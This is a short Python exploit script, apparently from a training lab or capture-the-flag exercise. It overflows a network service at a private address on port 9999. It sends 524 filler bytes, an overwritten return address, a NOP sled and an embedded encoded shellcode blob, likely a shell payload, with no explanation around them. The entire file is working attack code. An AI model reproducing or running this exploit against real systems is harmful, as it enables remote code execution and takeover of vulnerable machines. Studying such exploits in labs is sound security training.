import sys,socket

ip = "10.10.144.175"
port = 9999

shell = ( "\xb8\x89\x8f\x3b\x0f\xd9\xe8\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x83\xef\xfc\x31\x47\x0e\x03\xce\x81\xd9\xfa\x2c\x75\x9f"
"\x05\xcc\x86\xc0\x8c\x29\xb7\xc0\xeb\x3a\xe8\xf0\x78\x6e\x05"
"\x7a\x2c\x9a\x9e\x0e\xf9\xad\x17\xa4\xdf\x80\xa8\x95\x1c\x83"
"\x2a\xe4\x70\x63\x12\x27\x85\x62\x53\x5a\x64\x36\x0c\x10\xdb"
"\xa6\x39\x6c\xe0\x4d\x71\x60\x60\xb2\xc2\x83\x41\x65\x58\xda"
"\x41\x84\x8d\x56\xc8\x9e\xd2\x53\x82\x15\x20\x2f\x15\xff\x78"
"\xd0\xba\x3e\xb5\x23\xc2\x07\x72\xdc\xb1\x71\x80\x61\xc2\x46"
"\xfa\xbd\x47\x5c\x5c\x35\xff\xb8\x5c\x9a\x66\x4b\x52\x57\xec"
"\x13\x77\x66\x21\x28\x83\xe3\xc4\xfe\x05\xb7\xe2\xda\x4e\x63"
"\x8a\x7b\x2b\xc2\xb3\x9b\x94\xbb\x11\xd0\x39\xaf\x2b\xbb\x55"
"\x1c\x06\x43\xa6\x0a\x11\x30\x94\x95\x89\xde\x94\x5e\x14\x19"
"\xda\x74\xe0\xb5\x25\x77\x11\x9c\xe1\x23\x41\xb6\xc0\x4b\x0a"
"\x46\xec\x99\x9d\x16\x42\x72\x5e\xc6\x22\x22\x36\x0c\xad\x1d"
"\x26\x2f\x67\x36\xcd\xca\xe0\x33\x1b\x7e\x8b\x2b\x19\x7e\x6d"
"\x10\x94\x98\x07\x78\xf1\x33\xb0\xe1\x58\xcf\x21\xed\x76\xaa"
"\x62\x65\x75\x4b\x2c\x8e\xf0\x5f\xd9\x7e\x4f\x3d\x4c\x80\x65"
"\x29\x12\x13\xe2\xa9\x5d\x08\xbd\xfe\x0a\xfe\xb4\x6a\xa7\x59"
"\x6f\x88\x3a\x3f\x48\x08\xe1\xfc\x57\x91\x64\xb8\x73\x81\xb0"
"\x41\x38\xf5\x6c\x14\x96\xa3\xca\xce\x58\x1d\x85\xbd\x32\xc9"
"\x50\x8e\x84\x8f\x5c\xdb\x72\x6f\xec\xb2\xc2\x90\xc1\x52\xc3"
"\xe9\x3f\xc3\x2c\x20\x84\xe3\xce\xe0\xf1\x8b\x56\x61\xb8\xd1"
"\x68\x5c\xff\xef\xea\x54\x80\x0b\xf2\x1d\x85\x50\xb4\xce\xf7"
"\xc9\x51\xf0\xa4\xea\x73" )

junk = "A" * 524
ret = "\xf3\x12\x17\x31"

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    s.recv(1024)
    s.send(junk + ret + "\x90" * 8 + shell+ "\r\n")
except:
    print("connection error")
    sys.exit(0)


